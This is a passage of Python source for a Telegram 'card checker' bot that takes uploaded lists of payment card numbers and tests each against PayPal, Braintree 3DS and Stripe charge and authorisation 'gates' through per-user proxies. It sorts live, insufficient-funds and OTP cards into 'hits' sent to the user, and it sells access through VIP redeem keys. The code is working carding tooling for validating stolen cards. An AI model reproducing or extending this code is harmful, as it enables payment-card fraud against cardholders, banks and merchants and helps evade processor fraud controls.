        stripe_charge_button = types.InlineKeyboardButton(text="𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 💳", callback_data='stripe_charge_file')
        stripe_auth_button = types.InlineKeyboardButton(text="𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 🔐", callback_data='stripe_auth_file')
        keyboard.add(paypal_button, passed_button, stripe_charge_button, stripe_auth_button)

        bot.reply_to(message, text=f'𝗖𝗵𝗼𝗼𝘀𝗲 𝗧𝗵𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗬𝗼𝘂 𝗪𝗮𝗻𝘁 𝗧𝗼 𝗨𝘀𝗲',reply_markup=keyboard)
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        with open("combo.txt", "wb") as w:
            w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data == 'pp_file')
def menu_callback_pp(call):
    def my_function():
        id=call.from_user.id
        gate='𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆'
        dd = 0
        live = 0
        risk = 0
        ccnn = 0
        insufficient = 0
        live_cards = []
        insuf_cards = []
        
        user_amount = get_user_amount(id)
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗣𝗮𝘆𝗣𝗮𝗹...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = paypal_gate(cc, user_amount, proxy)
                    execution_time = time.time() - start_time
                    
                    # ✅ APPROVED CARDS - collect
                    if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ INSUFFICIENT FUNDS CARDS - collect
                    elif "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀" in last:
                        insufficient += 1
                        insuf_cards.append(f"💰 <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ❌ DECLINED CARDS
                    elif 'risk' in last.lower():
                        risk+=1
                    elif '𝗖𝗩𝗩' in last:
                        ccnn+=1
                    else:
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
💵 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗣𝗮𝘆𝗣𝗮𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        if live_cards or insuf_cards:
            all_hits = live_cards + insuf_cards
            hits_text = f"<b>💳 #pp_Gateway ${user_amount} — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'passed_file')
def menu_callback_passed(call):
    def my_function():
        id=call.from_user.id
        gate='𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆'
        dd = 0
        live = 0
        risk = 0
        ccnn = 0
        challenge = 0
        live_cards = []
        
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗣𝗮𝘀𝘀𝗲𝗱...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $2.99")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = passed_gate(cc, proxy)
                    execution_time = time.time() - start_time
                    
                    # فقط "3DS Authenticate Attempt Successful" - collect
                    if "3DS Authenticate Attempt Successful" in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    elif "3DS Challenge Required" in last:
                        challenge += 1
                    elif 'risk' in last.lower():
                        risk += 1
                    elif 'CVV' in last:
                        ccnn += 1
                    else:
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗩𝗕𝗩
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {live}
⚠️ 𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲: {challenge}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗩𝗕𝗩
━━━━━━━━━━━━━━━━━
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {live}
⚠️ 𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲: {challenge}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        if live_cards:
            hits_text = f"<b>🛡️ #vbv_Gateway $2.99 — 𝗛𝗶𝘁𝘀 [{len(live_cards)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(live_cards)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stripe_charge_file')
def menu_callback_stripe_charge(call):
    def my_function():
        id=call.from_user.id
        gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲'
        dd = 0
        live = 0
        risk = 0
        ccnn = 0
        insufficient = 0
        live_cards = []
        insuf_cards = []
        
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲...⌛\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $1.00")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = stripe_charge(cc, proxy)
                    execution_time = time.time() - start_time
                    
                    # ✅ CHARGE SUCCESS - collect
                    if "Charge !!" in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ INSUFFICIENT FUNDS - collect
                    elif "Insufficient Funds" in last:
                        insufficient += 1
                        insuf_cards.append(f"💰 <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ❌ DECLINED CARDS
                    elif 'Declined' in last:
                        dd += 1
                    elif 'Incorrect' in last:
                        ccnn += 1
                    else:
                        risk += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
💵 𝗔𝗺𝗼𝘂𝗻𝘁: $1.00
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲
━━━━━━━━━━━━━━━━━
✅ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        if live_cards or insuf_cards:
            all_hits = live_cards + insuf_cards
            hits_text = f"<b>⚡ #stripe_charge $1.00 — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stripe_auth_file')
def menu_callback_stripe_auth(call):
    def my_function():
        id=call.from_user.id
        gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵'
        dd = 0
        live = 0
        insufficient = 0
        otp = 0
        live_cards = []
        insuf_cards = []
        otp_cards = []
        
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = stripe_auth(cc, proxy)
                    execution_time = time.time() - start_time
                    
                    # ✅ APPROVED - collect
                    if "Approved" in last and "Insufficient" not in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ APPROVED WITH INSUFFICIENT - collect
                    elif "Insufficient" in last:
                        insufficient += 1
                        insuf_cards.append(f"💰 <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ OTP REQUIRED - collect
                    elif "Otp" in last:
                        otp += 1
                        otp_cards.append(f"⚠️ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ❌ DECLINED
                    else:
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
⚠️ 𝗢𝗧𝗣: {otp}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
⚠️ 𝗢𝗧𝗣: {otp}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        all_hits = live_cards + insuf_cards + otp_cards
        if all_hits:
            hits_text = f"<b>🔐 #stripe_auth — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
    def my_function():
        try:
            code = message.text.split(' ')[1].strip().upper()
            
            if is_code_used(code):
                bot.reply_to(message, '<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗱𝗲 𝗵𝗮𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗲𝗲𝗻 𝘂𝘀𝗲𝗱</b>', parse_mode="HTML")
                return
            
            with open("data.json", 'r', encoding='utf-8') as file:
                json_data = json.load(file)
            
            if code not in json_data:
                bot.reply_to(message, '<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗱𝗲</b>', parse_mode="HTML")
                return
            
            timer = json_data[code]['time']
            typ = json_data[code]['plan']
            
            json_data[str(message.from_user.id)] = {
                "plan": typ,
                "timer": timer
            }
            
            with open("data.json", 'w', encoding='utf-8') as file:
                json.dump(json_data, file, indent=2)
            
            del json_data[code]
            with open("data.json", 'w', encoding='utf-8') as file:
                json.dump(json_data, file, indent=2)
            
            mark_code_as_used(code)
            
            msg = f'''<b>𓆩 𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𓆪 ✅
💎 𝗗𝗲𝘃 : 『@yadistan』
⏳ 𝗧𝗶𝗺𝗲 : {timer}  ✅
📝 𝗧𝘆𝗽𝗲 : {typ}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
            
        except IndexError:
            bot.reply_to(message, '<b>❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗰𝗼𝗱𝗲\nمثال: /redeem MINUX-XXXX-XXXX-XXXX</b>', parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, f'<b>❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}</b>', parse_mode="HTML")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== أمر إنشاء الأكواد المعدل ==================
@bot.message_handler(commands=["code"])
def create_code(message):
    def my_function():
        user_id = message.from_user.id
        
        # التحقق من صلاحية المشرف - مقارنة مباشرة بالأرقام
        if user_id != admin:
            bot.reply_to(message, "<b>❌ هذا الأمر متاح فقط للمشرف</b>")
            return
        
        try:
            # استخراج عدد الساعات
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "<b>❌ استخدم: /code 24</b>")
                return
            
            h = float(parts[1])
            
            # قراءة ملف البيانات
            with open("data.json", 'r', encoding='utf-8') as json_file:
                existing_data = json.load(json_file)
            
            # إنشاء كود عشوائي
            characters = string.ascii_uppercase + string.digits
            part1 = ''.join(random.choices(characters, k=4))
            part2 = ''.join(random.choices(characters, k=4))
            part3 = ''.join(random.choices(characters, k=4))
            pas = f"YADISTAN-{part1}-{part2}-{part3}"
            
            # حساب وقت الانتهاء
            current_time = datetime.now()
            expiry_time = current_time + timedelta(hours=h)
            expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M")
            
            # حفظ الكود
            new_data = {
                pas: {
                    "plan": "VIP",
                    "time": expiry_str,
                }
            }
            existing_data.update(new_data)
            
            with open("data.json", 'w', encoding='utf-8') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
            
            # إرسال الكود
            msg = f'''<b>╔═══════════════════╗
𓆩 𝗞𝗲𝘆 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𓆪 🌹💸
╚═══════════════════╝

📝 𝗣𝗟𝗔𝗡 ➜ VIP
⏳ 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {expiry_str}
🔑 𝗞𝗘𝗬 ➜ <code>/redeem {pas}</code>
</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
            
        except ValueError:
            bot.reply_to(message, "<b>❌ يجب إدخال عدد ساعات صحيح</b>")
        except Exception as e:
            bot.reply_to(message, f"<b>حدث خطأ: {str(e)[:50]}</b>")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Admin: Add/Remove VIP ==================

def _resolve_user_id(raw):
    """Resolve a raw string (user_id or @username) to an integer user_id.
    Priority: numeric ID → DB lookup → Telegram API get_chat().
    Returns (user_id: int, display: str) or (None, error_msg: str)."""
    raw = raw.strip()

    # ── Numeric ID ────────────────────────────────────────────────
    if raw.lstrip('-').isdigit():
        return int(raw), raw

    # ── Username ──────────────────────────────────────────────────
    uname = raw.lstrip('@')

    # 1. DB lookup (fast — only works if user already used the bot)
    uid = db.get_user_id_by_username(uname)
    if uid:
        return uid, f"@{uname} (ID: {uid})"

    # 2. Telegram API fallback — works for any public username
    try:
        chat = bot.get_chat(f"@{uname}")
        if chat and chat.id:
            # Persist for future lookups
            db.save_user(chat.id,
                         username=chat.username,
                         first_name=getattr(chat, 'first_name', None))
            return chat.id, f"@{uname} (ID: {chat.id})"
    except Exception:
        pass

    return None, (
        f"❌ @{uname} nahi mila.\n\n"
        "Possible reasons:\n"
        "• Username galat hai\n"
        "• Username private hai ya exist nahi karta\n"
        "• User ID use karo: /addvip 123456789 [days]"
    )


@bot.message_handler(commands=["addvip"])
def addvip_command(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>📌 Usage:\n"
            "<code>/addvip &lt;user_id | @username&gt; [days]</code>\n\n"
            "• days default = 30\n"
            "• Example: <code>/addvip 123456789 7</code>\n"
            "• Example: <code>/addvip @yadistan 30</code></b>",
            parse_mode='HTML')
        return

    target_id, display = _resolve_user_id(parts[1])
    if target_id is None:
        bot.reply_to(message, f"<b>❌ {display}</b>", parse_mode='HTML')
        return

    days = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 30

    expiry = datetime.now() + timedelta(days=days)
    expiry_str = expiry.strftime("%Y-%m-%d %H:%M")

    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            data = {}
        if str(target_id) not in data:
            data[str(target_id)] = {}
        data[str(target_id)]['plan']  = '𝗩𝗜𝗣'
        data[str(target_id)]['timer'] = expiry_str
        with open("data.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

    # ── Save to database ──────────────────────────────────────────
    uname_db = parts[1] if parts[1].startswith('@') else None
    try:
        chat_info = bot.get_chat(target_id)
        uname_db  = chat_info.username or uname_db
        fname_db  = chat_info.first_name or ''
    except Exception:
        fname_db  = ''
    db.save_vip_grant(target_id, username=uname_db, first_name=fname_db,
                      days=days, expiry=expiry_str)
    db.save_user(target_id, username=uname_db, first_name=fname_db, plan='VIP')

    bot.reply_to(message,
        f"<b>✅ VIP Added!\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 User ID: <code>{target_id}</code>\n"
        f"⏳ Duration: {days} days\n"
        f"📅 Expires: {expiry_str}</b>",
        parse_mode='HTML')

    try:
        bot.send_message(target_id,
            f"<b>🎉 Congratulations!\n"
            f"━━━━━━━━━━━━━━━\n"
            f"✅ Aapko VIP access de di gayi hai!\n"
            f"📅 Expires: {expiry_str}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"[⌤] Bot by @yadistan</b>",
            parse_mode='HTML')
    except Exception:
        pass


@bot.message_handler(commands=["removevip"])
def removevip_command(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>📌 Usage:\n"
            "<code>/removevip &lt;user_id | @username&gt;</code>\n\n"
            "• Example: <code>/removevip 123456789</code>\n"
            "• Example: <code>/removevip @yadistan</code></b>",
            parse_mode='HTML')
        return

    target_id, display = _resolve_user_id(parts[1])
    if target_id is None:
        bot.reply_to(message, f"<b>❌ {display}</b>", parse_mode='HTML')
        return

    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            data = {}
        if str(target_id) not in data:
            bot.reply_to(message,
                f"<b>⚠️ User <code>{target_id}</code> data.json mein nahi mila.\n"
                f"(Shayad unhone bot use nahi kiya.)</b>",
                parse_mode='HTML')
            return
        old_plan = data[str(target_id)].get('plan', '𝗙𝗥𝗘𝗘')
        data[str(target_id)]['plan']  = '𝗙𝗥𝗘𝗘'
        data[str(target_id)]['timer'] = 'none'
        with open("data.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

    db.remove_vip_grant(target_id)
    db.save_user(target_id, plan='FREE')

    bot.reply_to(message,
